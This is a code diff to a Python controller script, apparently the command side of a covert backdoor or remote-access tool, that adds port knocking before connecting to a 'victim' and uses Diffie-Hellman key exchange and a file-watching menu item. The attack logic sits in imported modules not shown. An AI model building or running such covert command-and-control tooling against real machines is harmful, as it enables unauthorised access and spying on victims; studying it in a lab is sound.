@@ -1,6 +1,7 @@
 import select
 from commander_utils import *
 from commander_cryptography import *
+from port_knocking import *
 
 if __name__ == '__main__':
     # Initialization + GetOpts
@@ -16,8 +17,11 @@ if __name__ == '__main__':
     # Key/Value Pair => [Socket] : (IP, Port)
     connected_clients = {}
 
-    # Initial connect to victim as passed by argument (and put in sockets_to_read)
+    # Perform port knocking
     print_config(destination_ip, destination_port, (source_ip, source_port))
+    perform_port_knocking(destination_ip, destination_port)
+
+    # Initial connect to victim as passed by argument (and put in sockets_to_read)
     victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)
 
     # Perform Diffie-Hellman Key Exchange (for encryption/decryption)
@@ -174,7 +178,7 @@ if __name__ == '__main__':
                             print(constants.RETURN_MAIN_MENU_MSG)
                             print(constants.MENU_CLOSING_BANNER)
 
-# MENU ITEM 9 - Watch File (BUG: Files that are nested and in sub-directories)
+# MENU ITEM 9 - Watch File
                 if command == constants.PERFORM_MENU_ITEM_NINE:
                     global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue, shared_secret)
 
